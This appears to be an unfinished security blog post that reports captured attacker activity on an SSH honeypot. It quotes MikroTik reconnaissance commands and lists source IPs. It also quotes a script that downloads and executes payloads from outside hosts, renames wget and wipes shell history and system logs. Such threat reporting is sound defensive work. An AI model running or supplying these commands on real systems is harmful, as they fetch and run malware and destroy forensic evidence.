---
title: "Microtik Bot Behavior"
date: 2021-02-2T00:00:03+00:00
weight: 1
aliases: ["/hpstats-01-2021"]
tags: ["TBD", "TBD"]
author: "malwaremily"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
disableShare: false
cover:
    image: "" # image path/url
    alt: "TBD" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
comments: false
description: "Honey Pot Statistics for January 2021"
disableHLJS: true # to disable highlightjs
---

I wrote a post about setting up honeypots on GCP where I stood up a low-interaction SSH honeypot. It has been a little more than a week and I've been able to capture some interesting behavior and some malware samples. This post will report on some of the interactions seen after succesful logins and end with some statics as well as a link to a raw password list generated from login attempts.

## Mminer echo "hi | cat -n 1

In all of my test deployments this year and ~10 times throughout the week I've seen the following automated behavior:
```
/ip cloud print
ifconfig
uname -a
cat /proc/cpuinfo
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
echo Hi | cat -n
```

This behavior has previously been seen by security researcher [@remco_verhoef](https://twitter.com/remco_verhoef) from [SANS](https://isc.sans.edu/forums/diary/From+Microtik+with+Love/23762/)

SRCIP 
51.222.139.65 (multiple times)
176.31.46.240
174.124.123.109 (multiple times)
188.32.225.20
51.222.139.65 (multiple times)
5.228.46.151
185.110.91.235 (multiple times)
162.104.171.249
219.94.94.161
98.125.186.145
83.165.192.43
97.121.144.188
```

While one may want to attribute these IPs to geolocations, it is possible that bad actors are using compromised machines to orchestrate automated attacks to gain reconnaissance information.

```


IP 68.183.132.100
```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.94.179[dot]103/Lava.sh; chmod 777 Lava.sh; sh Lava.sh; tftp 23.94.179.103 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 23.94.179.103; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *
```

```
source-ip=125.212.233.74
cat /etc/issue
```

```
source-ip=103.64.12.117
wdir=\"/bin\"\nfor i in \"/bin\" \"/home\" \"/root\" \"/tmp\" \"/usr\" \"/etc\"\ndo\nif [ -w $i ]\nthen\nwdir=$i\nbreak\nfi\ndone\ncd $wdir\ncurl http://104.233.180.201/1.txt -o ygljglkjgfg0\nchmod +x ygljglkjgfg0\n./ygljglkjgfg0\nwget http://104.233.180.201/1.txt -O ygljglkjgfg1\nchmod +x ygljglkjgfg1\n./ygljglkjgfg1\ngood http://104.233.180.201/1.txt -O ygljglkjgfg2\nchmod +x ygljglkjgfg2\n./ygljglkjgfg2\nsleep 2\nwget http://104.233.180.201/1a.txt -O sdf3fslsdf13\nchmod +x sdf3fslsdf13\n./sdf3fslsdf13\ngood http://104.233.180.201/1a.txt -O sdf3fslsdf14\nchmod +x sdf3fslsdf14\n./sdf3fslsdf14\ncurl http://104.233.180.201/1a.txt -o sdf3fslsdf15\nchmod +x sdf3fslsdf15\n./sdf3fslsdf15\nsleep 2\nmv /usr/bin/wget /usr/bin/good\nmv /bin/wget /bin/good\ncat /dev/null >/root/.bash_history\ncat /dev/null > /var/log/wtmp\ncat /dev/null > /var/log/btmp\ncat /dev/null > /var/log/lastlog\ncat /dev/null > /var/log/secure\ncat /dev/null > /var/log/boot.log\ncat /dev/null > /var/log/cron\ncat /dev/null > /var/log/dmesg\ncat /dev/null > /var/log/firewalld\ncat /dev/null > /var/log/maillog\ncat /dev/null > /var/log/messages\ncat /dev/null > /var/log/spooler\ncat /dev/null > /var/log/syslog\ncat /dev/null > /var/log/tallylog\ncat /dev/null > /var/log/yum.log\ncat /dev/null >/root/.bash_history\nls -la /etc/daemon.cfg\nexit $?\n\n\n
```

```
do
if [ -w $i ]
then
wdir=$i
break
fi
done
cd $wdir
curl http://104.233.180.201/1[dot]txt -o ygljglkjgfg0
chmod +x ygljglkjgfg0
./ygljglkjgfg0
wget http://104.233.180.201/1[dot]txt -O ygljglkjgfg1
chmod +x ygljglkjgfg1
./ygljglkjgfg1
good http://104.233.180.201/1[dot]txt -O ygljglkjgfg2
chmod +x ygljglkjgfg2
./ygljglkjgfg2
sleep 2
wget http://104.233.180.201/1a[dot]txt -O sdf3fslsdf13
chmod +x sdf3fslsdf13
./sdf3fslsdf13
good http://104.233.180.201/1a[dot]txt -O sdf3fslsdf14
chmod +x sdf3fslsdf14
./sdf3fslsdf14
curl http://104.233.180.201/1a[dot]txt -o sdf3fslsdf15
chmod +x sdf3fslsdf15
./sdf3fslsdf15
sleep 2
mv /usr/bin/wget /usr/bin/good
mv /bin/wget /bin/good
cat /dev/null >/root/.bash_history
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/boot.log
cat /dev/null > /var/log/cron
cat /dev/null > /var/log/dmesg
cat /dev/null > /var/log/firewalld
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/spooler
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/tallylog
cat /dev/null > /var/log/yum.log
cat /dev/null >/root/.bash_history
ls -la /etc/daemon.cfg
exit $?
```


## TOP USERNAME/PASSWORD COMBOS
## TOP IP OFFENDERS

## Raw password list
[Link to Password List](https://gist.github.com/eeubanks/4948c56665c163e2d0e63b2e2e9eb85a)

ssh.password=
sed 's/.*=//'
